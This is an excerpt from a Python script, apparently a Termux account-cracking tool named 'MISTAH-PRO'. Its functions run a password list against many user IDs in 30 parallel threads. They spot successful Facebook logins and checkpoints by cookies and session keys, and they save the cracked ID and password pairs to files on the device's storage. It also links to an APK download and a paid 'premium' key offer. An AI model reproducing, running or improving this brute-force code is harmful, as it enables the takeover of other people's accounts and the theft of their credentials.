...
----------------------------------------------
 ...
 Tool Name : MISTAH-PRO
 Type type : FREE
 Version   : 1.0
----------------------------------------------
 MISTAH Pro version 1.0
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/MISTAH_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi MISTAH Sir, I Need To Buy Your Paid MISTAH PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python MISTAH.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                with tred(max_workers=30) as MISTAH:     
                        ...
                        for psx in user:
                                ...
                                MISTAH.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MISTAH-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        MISTAH=session.cookies.get_dict().keys()
                        if "c_user" in MISTAH:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [MISTAH-OK] %s | %s'%(ids,pas))
                                open('/sdcard/MISTAH-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MISTAH:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MISTAH-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MISTAH-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MISTAH-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MISTAH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MISTAH-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MISTAH-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MISTAH-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MISTAH-OK] '+uid+' | '+pas+'\033[1;97m')
